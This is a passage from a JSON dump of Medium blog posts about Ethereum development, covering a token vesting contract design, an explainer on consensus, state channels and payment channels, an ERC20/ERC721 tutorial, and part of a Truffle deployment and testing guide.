the same person who issues buyer bonus token grants? We needed a way to separate duties and responsibilities for internal business process reasons. More complexity!And, what if\u2026 heaven forbid, something were to go horribly wrong during the IEO. Maybe someone makes a huge irreversible mistake, transferring a large sum of funds to an invalid Ethereum address? Maybe a hacker finds an exploit in our contract and kills or seizes control of it mid-IEO? We needed at minimum to have a way to halt the smart contract so that we could pick up the pieces and start again with a better solution.We took some time to consider our findings so we would be sure to support all the uncovered necessary token issuing scenarios and administrative functions.Next, I will tell you a bit about specifically what we came up. If you are involved with a project that is doing an IEO or an ICO, this may be of interest to you.1. Start with a strong foundationFor a compliant token ecosystem, we wanted to create a next-generation ERC-20 smart contract that correctly provides a typical structure for managing token grants to employees, founders, advisors and third parties, such as exchanges or broker-dealers.After searching high and low through available open source solutions such as this and that, we found available solutions to be a bit too simplistic for our needs. There may be more applicable implementations available already but we weren\u2019t able to find them. So we decided to create our own.Not wanting to completely reinvent the wheel, we chose to base our contract on the solid foundations of the tried and true: proven battle-tested code that implements the underlying needs of our token, namely the ability for it to adhere to a standard (ERC20) and capabilities for creating and administering roles. That led us to the good folks at OpenZeppelin.org who offer exactly what we were looking for, in the form of reusable, tested open-source code that follows best practices, available now at OpenZeppelin-Solidity.2. Analyze our own needs in depth.We needed to deliver on specific functionality, such as:Ensuring that we can enforce compliance requirementsIncentivizing different parties in a similar manner to options vestingEnabling a way for tokens that are not vested to be returned to the pool through revocationAfter discussions with several token exchanges it became clear that, for doing IEO\u2019s and token launchpads, it would necessary to provide exchanges both unlocked pools and templated pools. This would allow for use cases like delivering tokens with uniform 12-month unlocking schedules where there can be no mistakes during token issuance.Additionally, after deciding on a grant mechanism based on uniform grant pools, we thought about workflows interacting with exchanges and realized we\u2019d need to be periodically able to top-up the exchange wallet from which tokens are issued, making sure that we enforce appropriate restrictions around how the exchange may issue token grants to buyers.The outcome was a very flexible design that lets a wallet holder self-register to confirm coins won\u2019t be delivered into a wrong wallet by accident, for large pool delivery or otherwise.One of the key requirements that we believe was missing in existing solutions is an enterprise-style roles and permissions mechanism allowing us to create a proper structure for managing and growing an organization. When your organization is only 10 people, this might seem like overkill. When you grow to hundreds of employees or even larger, as startups hope to achieve, having proper organizational controls becomes very important.Additionally, we\u2019ve provided the ability to create tools to administer, approve and centralize or decentralize token granting within different departments, while always having \u201cSuper Administration\u201d capability.3. Build upon the foundation, adding capabilities in a modular fashion.This was done by writing contract code for each part of the overall behavior in isolation and then combining the contracts together to create the whole working system. This best practice is widely encouraged for the development of nontrivial smart contracts. A solid design principle is to build software in units that do one thing.Here is a summary of what we\u2019ve built:Flexible Revocability ControlsSimultaneously supports both revocable and irrevocable token grants. Use cases for this are token purchases (irrevocable) as well employee compensation plans or advisors (revocable).At the time of grant, tokens get deposited into the beneficiary\u2019s account, but only the vested (released) portion can be spent. We like this model because it ensures the not-vested tokens are stored safely with the beneficiary and remain locked, with no possibility of unreleased tokens being accidentally spent out of a storage wallet or appropriated for some other purpose.If a revocable token grant later is revoked by the grantor, the beneficiary gets to keep the vested tokens, and the remaining unreleased tokens will be immediately returned to the grantor\u2019s pool whence they came.Grantor Roles and Pool TemplatesWe built support for a grantor role, a Boolean state which can be assigned to one or multiple Ethereum accounts. This gives us the ability to form any number of funded grant pools of to be used for different classes of token grant, each having its own representative individual serving as grantor.Each grant pool can be assigned its own uniform vesting schedule to be applied equally to grants made to all beneficiaries from that pool. Restrictions can be set to parameterize limits on the grantor\u2019s ability to set start dates. A grantor expiration date can also be set to automatically close the pool on a certain date. These restrictions can be changed administratively by us later if it becomes necessary.There\u2019s also an ability to create one-off grants, where each beneficiary has a unique, unshared vesting schedule associated to its grant.Traditional vesting, cliff, start date, intervalsThe vesting schedule mechanism supports four parameters: start date, cliff date, end date, and interval, all measured in days. If the interval is set to 1, the grant will vest linearly. If the interval is a set to number such as 30, vesting bumps up every 30 days. There is a restriction that both the length of the cliff and the overall duration must be an even multiple of the interval. This flexibility allows for many possible vesting patterns.All grant-related dates are counted in whole days (by convention, the number of days since the Unix epoch, or January 1, 1970), with each day starting at midnight UTC time. This locks all vesting to the same clock to help facilitate orderly bookkeeping. It also disallows absurd cases like grants that are 15 minutes long, etc.We decided on having a limit of one vesting grant at a time per account. A beneficiary can still have multiple grants in effect on different terms simply by providing us a new Ethereum account to be used for each new grant.Safe Delivery RegistrationWe included support for an address self-registration mechanism, along with \u201csafe\u201d methods that only transact with a verified address. These are provided to help prevent token loss through accidental bad data.Roles and permissionsWe provided enterprise-style support for roles and permissions, which also utilize the safe delivery mechanism to prevent loss of ownership control or accidental transfer of ownership to an invalid address.Tests, out of the boxFull automated test coverage of the contract code is provided, written in node.js.Not supportedWe decided not to support multiple simultaneous vesting schedules for one beneficiary. Implementing that looked to be complicated and transactions even with one vesting schedule, the primary use case, would have cost a lot of gas. A workaround is simply to use more Ethereum accounts if needed, one for each additional token grant.We don\u2019t support the continuous release of tokens throughout a day (as explained above).The CodeThe full source code is available here.We at CPUcoin will soon launch our IEO and we hope you will find our vesting token implementation useful. Even if you\u2019re not planning to use the code yourself, your review of it is most welcome and we are eager to hear any thoughts you\u2019d like to share. Please be warned that it\u2019s still brand new code. While it has been tested for most important use cases, it has not yet been used in production so there is the possibility it could still contain a bug or two.We thank you for any feedback offered here or in GitHub!", "responses": 1, "tags": ["Ethereum", "Blockchain", "Erc20 Token", "Solidity", "Openzeppelin"]}, {"title": "Advanced Blockchain Concepts for Beginners", "post_link": "https://medium.com/@mycoralhealth/advanced-blockchain-concepts-for-beginners-32887202afad?source=search_post", "author_name": "Coral Health", "author_link": "https://medium.com/@mycoralhealth", "publish_date": "2018-05-08", "last_modified_date": "2019-08-07", "readtime": "11.3", "claps": 881, "voters": 85, "content": "Advanced Blockchain Concepts for BeginnersCoral HealthFollowMay 8, 2018 \u00b7 12 min readMany readers by now have seen our coding tutorials on how to code your own blockchain, how to code your own proof of work, and how to set up a P2P network. After reading these tutorials, there you are, confident in your blockchain mastery and eager to tell everyone all about your newfound knowledge at your next meetup!But then you walk up to the water cooler and hear a conversation like this:\u201cPayment channels are the next big thing!\u201d\u201cI\u2019m pretty skeptical of the Bitcoin Lightning Network. While payment channels sound great in concept, how on earth are they going to solve the traveling salesman problem at that kind of network scale? Side chains are where it\u2019s at!\u201d\u201cYou might be right. State channels are pretty cool. Maintaining turing completeness on both the main and side chains gives a lot of functionality and scaling flexibility.\u201dWhat on earth are they talking about? Don\u2019t worry! We\u2019re going to help you out. In this article, we\u2019ll walk you through all the latest buzz words and concepts in advanced blockchain development, but keep the details at a manageable level.By the end of this post, you\u2019ll be able to freely participate in conversations like the above. This is not a coding tutorial, as we\u2019ll just be presenting important concepts at a high level. However, we may follow up with programming tutorials on these ideas. This article will be helpful to both programmers and non-programmers alike. Let\u2019s get going!Here are the ideas we\u2019ll tackle and build on in this article:Byzantine fault toleranceSmart contractsTuring completenessDelegated Proof of StakeState channels / Side chainsPlasmaPayment channelsByzantine Fault ToleranceByzantine fault tolerance (BFT) is what keeps the blockchain fundamentally secure. For simplicity, let\u2019s say there were 100 nodes in a blockchain network (there are currently about 10,500 full Bitcoin nodes in the world). What happens when one node wants to tamper with the latest block and say other Bitcoin users sent him a whole bunch of Bitcoin when they really didn\u2019t?The system needs to be fault tolerant and be able to override this malicious node and agree on the correct state of the blockchain.The term originated from the \u201cByzantine Generals Problem\u201d. Let\u2019s take a quick look at it:Photo credit: https://www.weusecoins.com/bitcoin-byzantine-generals-problem/In this scenario, the yellow camps need to coordinate to attack the central enemy city. But they need to agree on a time to attack. To do this, the camps need to clandestinely send messengers through the enemy city to tell another camp when to attack.Not only does the receiving camp need to receive the message, it needs to send back a messenger so the sending camp knows the receiving camp got the message. The receiving camp needs to know the sending camp got the message acknowledging the receiving camp got the original message. You can see this cycle goes on forever!Throw in another wrinkle: what if there is a traitor camp that intentionally does not send a messenger, or sends a messenger with the wrong information?In the days before computers, this \u201cByzantine Generals Problem\u201d was unsolvable. Luckily today, we have computers and distributed systems. The solution to the Byzantine Generals Problem in blockchain is Proof of Work.Our Proof of Work tutorial talks about it in depth, but the best explanation might come from Satoshi Nakamoto himself. If the camps above start receiving messages that don\u2019t agree, they rely on executing a Proof of Work. The Proof of Work is sufficiently complicated and requires significant computing power. Once one camp solves the Proof of Work, it broadcasts the results to the other camps. This message is now accepted in a chain of messages and the competing messages are dropped by the other camps.If the solving camp tampered with the data, the hashed chain would be quickly identified by the other camps as faulty and rejected in favor of the next solving camp. This provides a disincentive for the initial camp to cheat, since they will have wasted a bunch of energy to solve the Proof of Work and gotten no benefit from it.Imagine over several hours, the camps produced a chain of messages that each required intensive Proof of Work. This means that the majority of the camps had to agree on this chain of messages and each camp can confidently trust the final outcome. It\u2019s important to note here that Proof of Work does not care about the message itself, only that the nodes agreed to the final message. This majority network consensus keeps it secure and provides a solution to the Byzantine Generals Problem, leading to Byzantine Fault Tolerance.Smart Contracts & Turing CompletenessLet\u2019s switch gears quickly before we get back to talking about trust mechanisms. We\u2019ll define what a \u201csmart contract\u201d is. The first blockchain that was popularized is obviously the Bitcoin blockchain. But the functionality of Bitcoin is very limited. All it can do is record transaction information. It\u2019s only useful to keep track of the fact that Alice sent Bob 1 Bitcoin.What if we wanted some richer logic? What if instead of Alice just simply sending Bob 1 Bitcoin, we could program in logic that says \u201cAlice and Bob place a sports bet. If the Cleveland Cavaliers ever lose to the Toronto Raptors in a playoff series, take 1 Bitcoin from Alice\u2019s wallet and transfer it to Bob\u2019s\u201d.How awesome would that kind of functionality be? We could program in that logic, have it sit on the blockchain and Bob can rest comfortably knowing he can safely place that bet and Alice will be forced to pay the 1 Bitcoin if the Raptors ever beat the Cavs, and Alice can rest comfortably knowing she\u2019ll never have to pay.This is exactly what Ethereum is. You can think of it as a programmable Bitcoin. Smart contracts are little programming functions that sit on the Ethereum blockchain. You invoke a smart contract by calling the contract (or function) address and the arguments you send it will produce a deterministic result based on the logic of the function.A sample Ethereum smart contract function looks like this:This function does a simple check to transfer tokens from Alice to Bob. The function signature takes in Bob\u2019s wallet address and an amount to transfer. The require statement ensures Alice has enough Ether (Ethereum\u2019s currency) to give Bob. Then the function subtracts that amount from Alice\u2019s wallet and adds the same amount to Bob\u2019s wallet.Pretty straight forward right? This is a smart contract in its simplest form. But there is a world of possibilities for smart contracts from creating healthcare applications (what we do at Coral Health) to making collectible digital asset based games like Cryptokitties.Turing CompletenessWhen people say Ethereum is \u201cTuring Complete\u201d it means that a fully featured programming language is available on the Ethereum blockchain. The code we wrote above is written in a language called Solidity, which is the specific smart contract language to Ethereum.By contrast, the Bitcoin blockchain is not Turing complete since it has little to no ability for data manipulation. It has no ability for a user to deploy if else or goto statements. This is a bit of a simplification but anytime you hear someone say something is \u201cTuring complete\u201d you can do a quick check to see if there is functionality for data changes, memory changes and if/else statements. If there is, that\u2019s usually what they mean.Now that we\u2019ve tackled a few of these definitions let\u2019s move back to trust considerations of the blockchain.Delegated Proof of Stake (DPOS)I want you to be the next Proof of Stake witness!If you want a deeper look at Proof of Stake check out our detailed POS post. In short, while Proof of Work is an effective mechanism to secure the blockchain and provides a trustless consensus paradigm, it\u2019s extremely energy intensive because of all the computing power required to solve hash problems. Also, while it was meant to be decentralized, it\u2019s actually becoming more centralized as miners consolidate and massive mining setups eat up larger shares of winning blocks.Delegated Proof of Stake (DPOS) aims to solve this. Initially conceived by Dan Larimer, instead of using hardware to solve hashes, he proposed that people in the network vote for \u201cwitnesses\u201d. These witnesses are responsible for keeping the network secure and each of these witnesses puts some amount of digital currency in escrow.The witnesses who put more funds in escrow have a greater chance of mining (or minting) the next block. The incentives line up nicely here. There are only a few witnesses and they get paid to be witnesses, so they are incentivized to not cheat. If they do cheat and get caught, they not only get voted out in favor of the next eagerly awaiting witness, they lose all the funds they had in escrow.Many people believe this is the future of the blockchain. It maintains network security and allows for scalability. The biggest criticism is that it heavily favors those with more funds as smaller holders have no chance of becoming witnesses. But the reality is, smaller players have no hope of participating in Proof of Work either, as mining from your own laptop at home is no longer a reality. Smaller players get outcompeted by bigger players who have massive mining rigs. STEEM and EOS are examples of DPOS blockchains. Even Ethereum is moving to POS with its Casper project.State Channels / Side ChainsSo far we\u2019ve been talking about all-or-nothing approaches. Pure decentralization vs. central servers, Proof of Work vs. Proof of Stake. Just like everything else in life, hybrid ideas might be superior to binary ones. Blockchain developers are quickly realizing this.As we\u2019ve talked about, writing to the blockchain is slow and expensive. This is because every node in the entire network needs to verify and slurp in the whole blockchain and all the data it contains. Executing a large smart contract on a blockchain can be prohibitively expensive, and doing things like storing images on blockchains is economically infeasible.What if we could run heavy computations in a more centralized fashion, say on a single server, and then periodically integrate the results onto the main blockchain for posterity. We temporarily expose some vulnerability while the parallel server runs the heavy computation, but we get a massive benefit in that we don\u2019t have to run the computation on chain, and simply need to store the results for future verification. This is the general premise behind Truebit. We won\u2019t get into all the details of Truebit but there is a concept of challengers, who check to see the computations that were made have high fidelity.This is what, at its core, state channels are. Imagine we wanted to play a game of Starcraft and have a smart contract that pays 1 ETH to the winner. It would be ridiculous for each participant to have to write on the main Ethereum network each time a Zergling was killed by a Zealot, or when a Command Center was upgraded to an Orbital Command. The gas cost (Ethereum gas, not Starcraft gas) and time for each transaction would be prohibitive.Instead, what if the game was played in its own \u201cchannel\u201d? Each time a player made a move, the state of the game is signed by each player. After an epic battle where the Protoss player takes out the remaining Zerg forces and forces a gg, the final state of the game (Protoss wins) is sent to a smart contract on the main chain. This neutral smart contract, known as a Judge, waits a while to see if the Zerg player disputes the outcome. If the Zerg player doesn\u2019t, the Protoss player is paid the 1 ETH.Instead of having to record thousands of transactions that occurred during the game on the main chain, all the transactions are done off chain and only the final state is recorded on chain.Similarly, a side chain is a separate blockchain that runs in parallel to the main chain. The term is usually used in relation to another currency that\u2019s pegged to the currency of the main chain. For example, staying with the Starcraft motif, say we had an in-game currency called Minerals (oh wait, we do!). We could allow players to peg their Ether (or ETH) to purchase more Minerals in-game. So we reserve some ETH on the main chain, and peg, say 500 Minerals to 1 ETH.Then the player can spend their 500 Minerals in-game however they wish. Given the rapid rate at which Minerals can be spent and earned, Mineral-based transactions only happen on the side chain.What\u2019s really cool is that this architecture is fractal. We can then have a side chain of the Mineral chain to represent another scarce in-game asset. We can then make a side chain of that scarce in-game asset, and so on. There is no limit to how many side chains and levels of side chains we can have!Plasma, a project by Ethereum, uses this side chain concept. It encourages transactions to happen on side chains (or child chains). An authority governs each of the child chains. If the authority starts acting maliciously, anyone on the child chain can quit the child chain and take back their pegged assets on the main chain. It\u2019s in its early stages of development but shows a lot of promise in handling some of Ethereum\u2019s scalability issues.Payment ChannelsLastly, we\u2019ll talk about payment channels. They\u2019re an extension of state channels and side chains. Let\u2019s say Alice wants to send Bob 1 Bitcoin but speed and transaction costs are important to them so they want to run this transaction off chain.They open up a communication line between them called a \u201cpayment channel\u201d. 1) Alice sends Bob the 1 Bitcoin. Turns out, Alice only owed Bob 0.5 Bitcoin so 2) Bob sends Alice back 0.5 Bitcoin. Then Bob takes Alice on a weekend getaway. Alice picks up the tab so 3) Bob reimburses Alice another 0.1 Bitcoin.Instead of recording these 3 separate transactions on the main chain, we just record the final state of the payment channel to the main chain.Another key idea of the payment channel is that Alice and Bob don\u2019t need to open up a channel directly between them every time they want to transact.Alice can access Bob transitively through Pete, who has a payment channel opened with both Alice and Bob.You can imagine in theory, the idea of payment channels really becomes powerful when you have a rich network of participants. Every node can access every other node without being directly connected to them. The system is able to determine the quickest path between two nodes who want to connect.Photo Credit: http://forklog.net/bitcoin-lightning-meetup-in-kyiv-what-will-happen-to-bitcoin-after-lightning-network/There are many critics of payment channels. Finding the quickest path between unconnected nodes is no trivial exercise. This is a classic \u201ctraveling salesman\u201d problem that has been worked on by top computer scientists for decades. Critics argue that it is highly unlikely payment channels like Bitcoin\u2019s Lightning and Ethereum\u2019s Raiden will work as expected in practice due to complexities like the traveling salesman problem. The key for you is just to know that these projects and potential solutions to blockchain scalability issues exist. Many of the smartest minds in the industry are working actively to bring them to life.Summing UpCongratulations! You\u2019ve just educated yourself on the most common advanced topics in blockchain that you\u2019ll hear about. By understanding these concepts, you have a firmer grasp on the fundamental tradeoffs and latest research on the blockchain than most industry \u201cexperts\u201d! Better yet, next time you hear your colleagues around the water cooler talking about state channels, the Lightning Network and Byzantine fault tolerance, not only will you know what they\u2019re talking about but you might be able to teach them a thing or two!In this article, we took a different approach from our regular coding tutorials. We felt it was important for you to conceptually understand these advanced topics in blockchain development. We\u2018ll return to our coding style of tutorials in the next set of posts.Be sure to check out our other tutorials!Code your own blockchainNetworkingProof of WorkProof of StakeIPFSP2PHyperledgerBuild a DApp on HyperledgerTo learn more about Coral Health and how we\u2019re using the blockchain to advance personalized medicine research, visit our website and follow us on Twitter!", "responses": 10, "tags": ["Blockchain", "Ethereum", "Bitcoin", "Plasma", "Solidity"]}, {"title": "Ethereum Development Walkthrough (Part 4: Tokens and ERCs)", "post_link": "https://medium.com/hackernoon/ethereum-development-walkthrough-part-4-tokens-and-ercs-68645cf2f73e?source=search_post", "author_name": "dev_zl", "author_link": "https://medium.com/@dev_zl", "publish_date": "2018-01-29", "last_modified_date": "2019-04-29", "readtime": "7.88", "claps": 720, "voters": 79, "content": "Ethereum Development Walkthrough (Part 4: Tokens and ERCs)dev_zlFollowJan 29, 2018 \u00b7 8 min readFrom a developer point of view, tokens on Ethereum are simply smart contracts. In the world of drinks, they could be coffee, and anyone could make their own variant.You\u2019ve probably heard of ERC20, ERC721, or other standards. These are simply a set of basic functions that the community of developers agreed to adopt. Nobody will stop you from using your own functions, and creating a script that will manage virtual coins however you like.A famous quote from Pirates of the Caribbean apply very well in this case:But following a standard has a lot of advantages that you should not overlook. First of all, when you make a token that comply with a standard, everybody will know what your token does and how to interact with it, and therefore, will trust it a bit more. DApps, like Mist, will recognize it as a token, and will show it with a special UI. Also, you\u2019ll find a generic implementation of the token smart contract already written by the community, in a framework like OpenZeppelin\u2019s for example, that is well tested by many experts, and gives you a solid starting point.In this tutorial, we will write a basic and incomplete ERC20 token from grounds up, then we will turn it into an ERC721 (which is fundamentally different) so we can see the differences between the two.The reason for that is, you will understand how a token works, that it is not a closed black box, and that the ERC20, an accepted standard that has been in work for two years so far, has failure-points that you\u2019ll not see if you are only running a couple commands to create your token instantly from a framework.Let\u2019s make our tokenThe ERC20 was created to standardize fungible tokens so they can be re-used by other applications: from wallets to decentralized exchanges.Fungible means that it can be interchanged with a token of the same type, in other words, all the tokens are identical (like money, a dollar is the same as any other dollar). A non-fungible token would be one that represents a unique asset (like a house, a property, a piece of art etc.). While a fungible token hold value in itself, a non-fungible token is just the representation of an asset in a smart contract.To make an ERC20 compliant token, we must implement the following functions and events:The standard doesn\u2019t provide the body of these functions, that\u2019s because you could write them however you like, and it\u2019s well within the standard to return null/false values if you don\u2019t want to support some functions.Note: In this tutorial, it\u2019s not interesting to copy the code, you\u2019ll benefit more from understanding what happens, full examples will be linked at the end of this tutorial anyway.ImplementationAt first, we would want to give our token a name, so we will use a public variable:Then give it a symbol:And of course the number of decimals:Since Solidity doesn\u2019t fully support fixed-point numbers, you have to represent all numbers like integers. Now, a value of \u201c123456\u201d, will be either \u201c1234.56\u201d tokens when you use 2 decimals, or \u201c12.3456\u201d if you use 4 decimals for example. A value of 0 decimals is when you don\u2019t want you token to be \u201cdivisible\u201d. Ether, the cryptocurrency of Ethereum, uses 18 decimals.Generally, you wouldn\u2019t use more than 18 decimals for your token, unless you want an expert from the other side of the world to tell you how stupid you are, and ask you why would you use more than 18 decimals, and tell you how 18 is the holy number because Ether uses 18 decimals.We will count the total supply of our token, and keep track of how much tokens everyone has:Of course you will start with 0 tokens, unless you generate some in the constructor of your token smart contract, like this for example:The \u201ctotalSupply()\u201d function is just a getter for the \u201ctotalSupply\u201d variable:Same for the \u201cbalanceOf()\u201d function:Now, the real magic happens in the \u201ctransfer()\u201d function, it\u2019s where an address can send tokens to another oneThat\u2019s really the core of an ERC20 token.\u201capprove()\u201d, \u201ctransferFrom()\u201d, and \u201callowance()\u201d functions are part of what makes a token ERC20 compliant too, but they are vulnerable.When an address \u201capprove()\u201d another one, the approved address could spend some tokens from the approving address balance on its behalf using the \u201ctransferFrom()\u201d function. \u201callowance()\u201d is just a getter function to see how much an address could \u201ctransferFrom()\u201d from the balance of another address.These functions actually represent security issues, because, when an address approve another one to spend X tokens, and for some reason decide to increase or decrease that amount to Y tokens, the approved address could quickly transfer the X tokens of the first allowance before the transaction to change the allowance is executed, and after it\u2019s executed, the approved address could transfer the Y newly approved tokens again. I said in the last parts that there is no certainty when a transaction is mined, and miners can slightly tamper with when some transactions are executed.Now, while some safer \u201ctransferFrom()\u201d implementations were suggested to make the function more fail-proof (as outlined above, the standard is just a bunch of prototypes of functions and expected behavior, and it\u2019s up to your to write the bodies) some other proposals are being discussed right now, because there are other shortcomings to the ERC20. Two of these propositions are the ERC223 and ERC777.The motive behind the ERC223 proposal is to avoid sending tokens to the wrong addresses or contracts that doesn\u2019t support using these tokens, because millions of dollars where lost due to that as outlined in the 223th Ethereum Request for Comments. The ERC777 tries to notify the receiving address of the token it will receive, among other things. The ERC777 proposal seems to have the most momentum in the community right now to replace the ERC20.ERC721Now, the ERC721 is fundamentally a different thing from the ERC20 and its family.In ERC721, tokens are unique. The ERC721 was proposed a few months ago, and the implementation that has made it famous is CryptoKitties, a game where people collect virtual cats, and these cats are represented with non-fungible tokens inside the smart contract that runs the game.Now, if we want to turn an ERC20 contract to an ERC721 one, we will need to see how the second keep track of the tokens.In ERC20, every address has a balance of tokens. In an ERC721 contract, every address will have a list of its tokens:Since Solidity has its limitations, and there is no \u201cindexOf()\u201d method for arrays, we have to keep track of a token in the owner array manually:We could of course implement our own library that finds the index of an element, but taking into account possibly long running loops, it\u2019s better to use a mapping.And of course, to track tokens easily, we can add a mapping that shows the owner of each token:That\u2019s all the difference between how the two proposals manage tokens.The \u201ctransfer()\u201d functions inside an ERC721 contract will set a new owner for the token:The code is longer, but it\u2019s simply the necessary steps to move a token.One point to not forget is, the ERC721 has also the \u201capprove()\u201d and \u201ctransferFrom()\u201d methods, so inside our transfer function, we would have to add an other instruction inside our \u201ctransfer()\u201d method, so an approved address for a token can no longer move the token once it has a new owner, something like the following one:MintingOne thing that can apply to both ERC20 and ERC721 tokens is, we would probably want to generate more fungible tokens, or create a new non-fungible token, we would do that with a function generally named \u201cMint()\u201d.An example for such a function is the code below:We create a new token with an arbitrary number. Depending on your use case, you would probably want to authorize only certain address(es) to be able to mint new tokens inside your contract.An important thing to note here is, while the \u201cmint()\u201d function is not present on the interface of the standards, we added it, just like we can add other functions to enhance and add more functionalities to our token. For example, we could add a system of buying and selling tokens for an amount of ether, or a function to remove tokens that we don\u2019t want anymore.MetadataNow, we said that non-fungible tokens represent an asset, so, in most cases, we would actually want to describe that asset. We could do using a string like the following:See, the smart contract is a certification rather than something that contains an object. You can\u2019t store a car inside a smart contract for example, but you could very well store its license plate, or some other legal identification.One of the most used techniques right now, when it comes to virtual assets, is to use an IPFS hash as metadata. An IPFS hash is the address of a file stored on IPFS. To put it in simple words, IPFS is like a torrent version of HTTP. When a file is added on IPFS, it would become virtually always available on at least one of the computers that are connected to the IPFS network.While the file is accessible on IPFS or a HTTP link for everyone to see, the \u201ccertification of ownership\u201d is registered in a smart contract. This is really not programming, but a new application of non-fungible tokens. It has a name \u201cCrypto-collectibles\u201d, and it\u2019s hot right now.Now, back to our codes, the original discussion of the ERC721 proposal is a bit dead as of now, and the original poster hasn\u2019t updated the thread in a while, so there is a new continuation of that discussion here. It\u2019s called ERC841 and they changed the name of non-fungible tokens to \u201cdeeds\u201d.There is also another proposal, ERC821, that wishes to implement newer and better design patterns inspired by the ERC223 & ERC777 proposals. ERC821 and ERC841 seek to achieve the same goal, but with a slightly different approach, both are not perfected yet, and you can join the discussion around these two potential standards if you have a valuable input.You can find example implementations of both ERC20 and ERC721 (that you should not use in production) on the Github repository for this part:devzl/ethereum-walkthrough-4ethereum-walkthrough-4 - Repository for the fourth part of the tutorial series on Ethereum, \"Ethereum development\u2026github.comAlternatively, it will be a good idea to take a look at the OpenZepplin framework, they have excellent, (mostly) audited, and modular smart contracts (Of course, you should read the content of every contract before deciding which ones to use).This conclude this fourth part of series. In the next one we will see how to create a DApp.If you liked this tutorial, you can find me @dev_zl.Bonus: ICOs & CrowdsalesInitial coin offerings (ICOs) are a bit outside of the development part of an Ethereum project, but in essence, they are just crowdfunding.If a startup needs some funds, they create their own token, and sell some during a period of time, called a crowdsale or ICO.Before smart contracts and the blockchain technology, startups would use a crowdfunding website to raise money, but those websites take generally a handsome fee in the process. Now, with an ICO, you cut the middleman and raise the money directly.Right now, there are more scams than real projects raising money, so from an investor point of view, you should be wary where to put your money. From a developer point of view, a crowdsale is just a smart contract, that sells some tokens from a start to an ending date in exchange for ether. There is no standard way to achieve that, but you will find a good implementation on OpenZepplin\u2019s repo for example. Alternatively, there is an easy tutorial on Ethereum\u2019s website.", "responses": 3, "tags": ["Ethereum", "Solidity", "Erc20", "Token", "Ethereum Development"]}, {"title": "A Gentle Introduction to Ethereum Programming, Part 3", "post_link": "https://medium.com/zeppelin-blog/a-gentle-introduction-to-ethereum-programming-part-3-abdd9644d0c2?source=search_post", "author_name": "Facu Spagnuolo", "author_link": "https://medium.com/@facuspagnuolo", "publish_date": "2018-01-12", "last_modified_date": "2019-02-13", "readtime": "7.35", "claps": 391, "voters": 80, "content": "A Gentle Introduction to Ethereum Programming, Part 3Facu SpagnuoloFollowJan 12, 2018 \u00b7 8 min readThis is the third part of our Ethereum introduction guide. If you haven\u2019t read parts 1 and 2, I highly recommend them to better understand this post.Enjoy, and please do not hesitate to reach out with questions, corrections or feedback.Index1. Taking the first steps2. Interacting with a contract3. Frameworks & Tools in the real world3.1. Deploying with Truffle3.2. Testing smart contracts3.3. OpenZeppelin4. A real DApp, a token marketplace \u2014 coming soon3. Frameworks & Tools in the real worldAs you may have noticed, most of the work that we\u2019ve been doing was pretty manual. Although this is a young industry, there are some tools that will make development easier. Let\u2019s see some of them.3.1. Deploying with TruffleUntil now, the only way we used to interact with our contracts was to deploy them manually through a Node console into a testrpc node and then load them using Web3. Now, let me introduce Truffle to you. It is an Ethereum development framework that will help us debugging, deploying, and testing smart contracts, among other things.The first thing we\u2019re going to do is to deploy a contract using Truffle. Let's create a new directory for this exercise and run the following commands to install Truffle and initialize our project:$ mkdir truffle-experiment$ cd truffle-experiment/$ npm install truffle@4.0.4$ npx truffle initYou will see some folders and files were created. Our directory should look like:truffle-experiment/\u251c\u2500\u2500 contracts/\u2502   \u2514\u2500\u2500 Migrations.sol\u251c\u2500\u2500 migrations/\u2502   \u2514\u2500\u2500 1_initial_migration.js\u251c\u2500\u2500 test/\u251c\u2500\u2500 truffle.js\u2514\u2500\u2500 truffle-config.jsThe contracts folder is where the smart contracts should be. The migrations folder will host javascript files that will help us deploying our contracts to the network. You may also have seen a Migrations contract in the first folder, this is where the history of our migrations is going to be stored on-chain. The test folder is initially empty and is intended to keep our test files. Finally, you will see a truffle.js and a truffle-config.js files. We will skip them by now, but you can read more in their documentation.Now, let\u2019s leave that boring stuff behind and focus on the interesting parts. To see an example of how we can deploy a contract using Truffle, we can use the same token contract example from the previous post of this guide. Please grab that code and paste it into a MyToken.sol file inside the contracts folder. Then, create a new migration file called 2_deploy_my_token.js file and copy the following lines into it:const MyToken = artifacts.require('./MyToken.sol')module.exports = function(deployer) {  deployer.deploy(MyToken)}As you can see, that migration will just deploy our token to the network. This time, we won\u2019t need a testrpc node running since Truffle already comes with a simulation node for development and testing purposes. We just need to open a development console running npx truffle develop and run the migrations using truffle migrate inside it. Then, you should see an output like this:truffle(develop)> truffle migrateUsing network \u2018develop\u2019.Running migration: 1_initial_migration.jsDeploying Migrations\u2026\u2026 0xf5776c9f32a9b5b7600d88a6a24b0ef433f559c31aaeb5eaf6e2fc5e2f7fa669Migrations: 0x8cdaf0cd259887258bc13a92c0a6da92698644c0Saving successful migration to network\u2026\u2026 0xd7bc86d31bee32fa3988f1c1eabce403a1b5d570340a3a9cdba53a472ee8c956Saving artifacts\u2026Running migration: 2_deploy_my_token.jsDeploying MyToken\u2026\u2026 0xc74019c2fe3b3ef1d4e2033c2e4b9fa13611f3150f8b6b37334a8e29e24b056cMyToken: 0x345ca3e014aaf5dca488057592ee47305d9b3e10Saving successful migration to network\u2026\u2026 0xf36163615f41ef7ed8f4a8f192149a0bf633fe1a2398ce001bf44c43dc7bdda0Saving artifacts\u2026We\u2019ll just care about the line MyToken: 0x345ca3e0...305d9b3e10, which tells us the address of our deployed token contract. By default, Truffle initializes the simulation node with 10 addresses with fake ETH as we saw when using testrpc, and we can access this array via web3.eth.accounts. Moreover, it deploys these contracts using the first address of this list (the one with index 0), which means that it will be the owner of MyToken.Given that Web3 is available inside the Truffle console, you can just run the following commands to check the owner\u2019s balance:truffle(develop)> owner = web3.eth.accounts[0]truffle(develop)> instance = MyToken.at('[DEPLOYED_ADDRESS]')truffle(develop)> instance.balanceOf(owner)Note: Please remember to replace [DEPLOYED_ADDRESS] by the address of the deployed contract given by Truffle, in this case: 0x345ca3e0...305d9b3e10.We can also send some tokens to another address and then check the updated balances:// send tokensamount = 10recipient = web3.eth.accounts[1]txHash = instance.sendTokens(recipient, amount, { from: owner })// check balancesinstance.balanceOf(owner)instance.balanceOf(recipient)We\u2019ve seen the recipient account now has 10 tokens! We can search the transaction information with the following line of code:web3.eth.getTransaction(txHash)3.2. Testing smart contractsThe next more interesting and useful thing about Truffle is that we can test our contracts. This framework lets you write tests in two different ways: Javascript and Solidity. In this post, we will just learn some basics about JS tests, which is the most used option.Truffle uses Mocha under the hood as the testing framework and Chai to perform assertions. It doesn\u2019t matter if you are not familiar with these libraries, both are 